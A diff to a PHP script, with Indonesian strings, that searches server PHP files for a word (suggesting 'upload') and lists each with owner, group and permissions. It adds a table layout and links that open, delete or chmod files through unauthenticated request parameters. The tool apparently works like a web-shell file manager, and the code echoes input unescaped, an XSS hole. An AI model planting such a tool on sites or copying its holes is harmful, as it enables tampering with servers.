@@ -73,7 +73,8 @@ if (isset($_GET['find']) && !empty($_GET['find'])) {
     if (empty($hasilPencarian)) {
         echo "Kata '$kataCari' tidak ditemukan dalam file-file PHP di direktori dan subdirektori.";
     } else {
-        echo "Kata '$kataCari' ditemukan dalam file-file berikut:<br>";
+        echo "<table border='1'>";
+        echo "<tr><th>File Path</th><th>Owner</th><th>Group</th><th>Permissions</th><th>Action</th></tr>";
         foreach ($hasilPencarian as $fileInfo) {
             $file = $fileInfo['path'];
             $permissions = $fileInfo['permissions'];
@@ -85,23 +86,21 @@ if (isset($_GET['find']) && !empty($_GET['find'])) {
 
             $deleteUrl = "http://{$_SERVER['HTTP_HOST']}{$_SERVER['REQUEST_URI']}&delete=" . urlencode($file);
             $chmodUrl = "http://{$_SERVER['HTTP_HOST']}{$_SERVER['REQUEST_URI']}&chmod=" . urlencode($file);
+            $openUrl = "http://{$_SERVER['HTTP_HOST']}" . htmlspecialchars($file, ENT_QUOTES, 'UTF-8');
 
-            echo "$file (Owner: $owner, Group: $group, Permissions: ";
-            // Warna hijau untuk user dan hitam untuk root
-            if ($owner === 'root') {
-                echo "<span style='color: black;'>$permissions</span>) ";
-            } else {
-                echo "<span style='color: green;'>$permissions</span>) ";
-            }
-
-            // Tambahkan tautan untuk menghapus file yang sesuai
-            echo "<a href='$deleteUrl'>Hapus</a> ";
-            // Tambahkan form untuk mengubah izin file
+            echo "<tr>";
+            echo "<td><a href='$openUrl' target='_blank'>$file</a></td>";
+            echo "<td>$owner</td>";
+            echo "<td>$group</td>";
+            echo "<td style='color: " . ($owner === 'root' ? 'black' : 'green') . ";'>$permissions</td>";
+            echo "<td><a href='$deleteUrl'>Hapus</a> | ";
             echo "<form method='post' action='$chmodUrl'>";
             echo "Ubah Permissions: <input type='text' name='permissions' placeholder='e.g., 0755' required> ";
             echo "<input type='submit' value='Ubah Permissions'>";
-            echo "</form><br>";
+            echo "</form></td>";
+            echo "</tr>";
         }
+        echo "</table>";
     }
 } else {
     echo "Harap berikan parameter 'find' dengan kata yang ingin dicari, misalnya: index.php?find=upload";
